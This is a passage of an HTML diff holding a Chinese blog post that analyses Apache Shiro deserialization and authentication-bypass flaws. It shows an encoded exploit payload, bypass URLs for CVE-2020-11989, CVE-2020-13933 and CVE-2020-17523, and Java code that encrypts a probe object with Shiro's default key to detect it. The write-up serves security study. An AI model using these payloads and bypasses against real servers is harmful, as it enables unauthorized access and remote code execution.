+<pre><code>GZPReCC1KobPE/KDBMHmj2rtPe+umB1i/1xPLBHfrsbHnOYN+Wjd+himW5PbiYiuS1j/I4lraT1t3+yFGzJPQci0M1ffDagNsG2f5p+e+wEgON25IkdcM2ZRlW6DvD8iTZgSiBG19gnzjCnKIJfrBx836wBFBg4sRk5NDOfc6KBkggWb4hi5rIjSaxB86dYezCLJWvwqWDcvOxkRXLBBSIM8R12H2VzF1PgdRtXI7d8UwdidiEcBrMNecwx6omHdLENt/yTCV0jhwuGq0lRyDTUXqg1N51zju7PMC6k38XQ1D5WY+P1EPlwoIeZ37tgCK7MSGvBObadle/UwRGTj1wzQwZTR5WgtRxIT7vtlUQF4zWVPVWy/UHZA5phAwvyIiUu5ojOjuZaYP0794BxoH9YSHLw86sx5WAHIQaI11PWKR+AVJUMRGlHcbx0dC+A5l73K+l0ei3ULN87/z0OufclpQbbJ0+Tl6RnTCOfhfbUSO9JaVAX0N31DDkAnehyDTvTciEov51Sdjp0QFhzUw2XNtOmoDkNrdefthbxRJb11n3UtEl5obBhWNbTRRbMcBV5dnA0vn+bf/vgbbXzPzZhmM8NJWCQKzP64MrjxhTksgh9sdA/EMMfyctPFmj89gFs0LLuC6ONQbjSA+M5eZBZzDjAAdxC+DqWzZ/kbGyeO+fnLnjItK9N4md/8c7BKJNxlxbcOIMpU3PClHZi0Szp7R4QJUi68kRMSNxr27kR9zfXAQsgAgDwtcBy0AW51vH9ulpXf6wJh3MaP/nugStATzilSN6cv0kRmHAA6gPgCXJXZFCMHcod2ippvmyH50viFTRo2t0+8+8xqHPiGdoa/nHS7hCIPDejSBGuT/X9vnXXDoePfaGrTjj0QBv65ye0sCXGUD3/Fx3TkdhywQ/1WssIiJcqhbca5YuP8zSZdJH6mQdr2qRxAVhCpn62HaS2cKPGQUuYvuRebgPCD8SAkutQ4Y0t69VZvg6sYDSPxD4xgz1XU91DoowEJnig539rd4wdG6eGL+sDpwTQjLeE9EEcH56+dm6jht+9Fn66jFM5iEaWJ82KeeyMO7T0IgfYz0EjdL1OFELgaELU2jFFWgAVRqWLg5oCEu2FrOXPgm0EaP0R1MUUk1vovvMNUDuGBMmk/6BFHU5fYMs3yqFrR6vUvVuiErLVk3Ivq/iaCiG0cRURhIOhbf9hYqTKan4nAdvu4zWNjbR42YtC1vgcoxujSeDZgpco5L5thyAv07PPVwAyDKmFZcpoZrz+XwzNKiByTH7ORPvGLTCKsHbTpRfoEz1UuMac3rMB3xtk=
+</code></pre>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219115839737.png" alt="image-20211219115839737"></p>
+<p>3.4    疑问：</p>
+<p>1.一开始，我控制BeanComparator.compare中的property。我是直接通过构造器去配置，但是报错了。</p>
+<pre><code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER);
+</code></pre>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219222301499.png" alt="image-20211219222301499"></p>
+<p>原因：因为在序列化的时候，priorityQueue.add(1)，会调用到BeanComparator.compare方法。可以看图中，因为这里的形参o1其实我们还没设置。所以才报的异常，这里的o1是需要在反序列化的时候直接传值的，所以我们只能先设置property为null，后面再通过反射去设置它的值。</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219222231766.png" alt="image-20211219222231766"></p>
+<h2 id="0x04-基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）"><a href="#0x04-基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）" class="headerlink" title="0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）"></a>0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）</h2><p>目的：如何在tomcat中获得response</p>
+<p>复现：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221095841370.png" alt="image-20211221095841370"></p>
+<p>其他思路：Linux下基于文件描述符的反序列化回显方式的思路</p>
+<h2 id="0x04-shiro721"><a href="#0x04-shiro721" class="headerlink" title="0x04 shiro721"></a>0x04 shiro721</h2><p>版本：Apache Shiro &lt; 1.4.2</p>
+<p>默认使用AES/GCM/PKCS5Padding模式 </p>
+<p>这个洞比较鸡肋，需要登陆后才能使用，并且它的加密方式决定了我们发送的payload越长，爆破方式去加密payload的过程越长</p>
+<p>有兴趣可以看下这位师傅的文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qianxinggz/p/13388405.html">https://www.cnblogs.com/qianxinggz/p/13388405.html</a></p>
+<h2 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h2><p>CVE-2020-11989</p>
+<ul>
+<li>Apache Shiro &lt; 1.5.3</li>
+</ul>
+<p>利用：/admin/xxx%252fxxx/</p>
+<p>漏洞修复：在1.5.3版本，采用标准的 getServletPath 和 getPathInfo 进行uri处理，同时取消了url解码，这样<code>pattIdxStart</code>与<code>pattIdxEnd</code>就是相同的数值</p>
+<p>CVE-2020-13933</p>
+<ul>
+<li>Apache Shiro &lt; 1.6.0</li>
+</ul>
+<p>利用：/admin/%3beee</p>
+<p>漏洞修复：加了一个fileter类进行过滤。</p>
+<p>CVE-2020-17523</p>
+<ul>
+<li>Apache Shiro &lt; 1.7.1</li>
+</ul>
+<p>利用：admin/%20</p>
+<h2 id="0x04-shiro框架-key爆破"><a href="#0x04-shiro框架-key爆破" class="headerlink" title="0x04 shiro框架 key爆破"></a>0x04 shiro框架 key爆破</h2><p>4.1 CC盲打，判断延迟</p>
+<p>4.2 YSO 的 URLDNS 针对 dnslog </p>
+<p>4.3 回显头中有没有 deleteMe</p>
+<ol>
+<li>我们需要构造一个继承于 <strong>PrincipalCollection</strong> 的序列化对象</li>
 </ol>
+<pre><code>public class shirokey &#123;
+    public static void main(String[] args) throws Exception &#123;
+        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
+        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;E:\\detect.ser&quot;));
+        obj.writeObject(simplePrincipalCollection);
+        obj.close();
+    &#125;
+
+&#125;
+</code></pre>
+<pre><code>public class shiroaes &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String path = &quot;E:\\detect.ser&quot;;
+        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+        AesCipherService aes = new AesCipherService();
+        ByteSource ciphertext = aes.encrypt(getBytes(path), key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+
+
+    public static byte[] getBytes(String path) throws Exception&#123;
+        InputStream inputStream = new FileInputStream(path);
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        int n = 0;
+        while ((n=inputStream.read())!=-1)&#123;
+            byteArrayOutputStream.write(n);
+        &#125;
+        byte[] bytes = byteArrayOutputStream.toByteArray();
+        return bytes;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221144240860.png" alt="image-20211221144240860"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221144230522.png" alt="image-20211221144230522"></p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>前前后后踩了好多坑，也从中学习到了很多，今天文中的这条不出意外的话应该是 Tomcat 的版本都可行的，最后感谢 p牛 感谢 <a target="_blank" rel="noopener" href="http://wjlshare.com/">大木头师傅</a> 感谢各位前辈。</p>
+<p> <strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></strong></p>
+<p><a target="_blank" rel="noopener" href="https://hpdoger.cn/2021/02/08/title:%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/#CVE-2020-11989">https://hpdoger.cn/2021/02/08/title:%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/#CVE-2020-11989</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -854,12 +1090,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>java代码审计-jfinal_cms</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">379</span></p>
+    <p><span class="copy-title">Title:</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">2.2k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-12-04, 14:12:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-09, 17:21:39</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/04/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-jfinal_cms/" title="java代码审计-jfinal_cms">http://example.com/2021/12/04/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-jfinal_cms/</a>
+    <p><span class="copy-title">Created At:</span>2021-12-14, 16:18:52</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-30, 16:45:32</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/" title="">http://example.com/2021/12/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
